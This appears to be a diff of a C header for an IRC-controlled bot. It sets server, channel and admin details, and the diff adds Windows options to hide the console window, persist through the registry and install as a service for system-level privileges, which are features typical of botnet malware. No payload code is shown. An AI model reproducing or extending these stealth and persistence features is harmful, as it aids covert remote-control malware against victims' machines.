@@ -46,22 +46,35 @@
 #define MAX_NAME 31
 
 /*
- * defining some options
- * which must be tweaked
- * per compile
+ * defining some IRC
+ * options which must be 
+ * tweaked per compile
  * maybe parse these 
  * options with a python
  * script
  */
-#define SERVER     "irc.freenode.net"
-#define PORT       "6667"
-#define CHANNEL    "#uuiiafa"
-#define U_NAME     "JSchmoeBot"
-#define N_NAME     "JSchmoeBot"
-#define IRC_PWORD  NULL
-#define BOT_PWORD  "test123"  
+#define SERVER     "irc.freenode.net"   // IRC server
+#define PORT       "6667"           // server port
+#define CHANNEL    "#uuiiafa"       // channel name
+#define U_NAME     "JSchmoeBot"     // username
+#define N_NAME     "JSchmoeBot"     // nickname
+#define IRC_PWORD  NULL             // password for nickname
+#define BOT_PWORD  "test123"        // password to authenticate nickname
 
-extern char *default_admins[];
+/*
+ * defining some client
+ * options which must be 
+ * tweaked per compile
+ * maybe parse these 
+ * options with a python
+ * script
+ * currently only for
+ * windows environments
+ */
+#define INSTALL_STARTUP             // install into registry 
+#define WINDOW_STEALTH              // hide console window
+#define INSTALL_SERVICE             // install as service for
+                                    // system level privileges
 
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 /*
@@ -91,13 +104,13 @@ typedef unsigned int SOCKET;
  * details of bot
  */
 typedef struct _account {
-    char u_name[MAX_NAME];        // username
-    char n_name[MAX_NAME];        // nickname
-    char *pword;            // username's password
-    char *channel;            // channel/privmsg
+    char u_name[MAX_NAME];          // username
+    char n_name[MAX_NAME];          // nickname
+    char *pword;                    // username's password
+    char *channel;                  // channel/privmsg
     char **admins;
-    unsigned short admin_size;    // size of admins array
-    unsigned short num_admins;    // number of admins
+    unsigned short admin_size;      // size of admins array
+    unsigned short num_admins;      // number of admins
 } Account, *pAccount;
 
 /*
@@ -106,14 +119,14 @@ typedef struct _account {
  * from IRC
  */
 typedef struct _message {
-    char n_name[MAX_NAME];        // nickname
-    char *contact;            // channel/privmsg
+    char n_name[MAX_NAME];          // nickname
+    char *contact;                  // channel/privmsg
     int contactSize;
-    char *command;            // command
+    char *command;                  // command
     int commandSize;
-    char *param;            // command [paramter]
+    char *param;                    // command [paramter]
     int paramSize;
-    char *msg;            // entire message
+    char *msg;                      // entire message
     int msgSize;
 } Message, *pMessage;
 
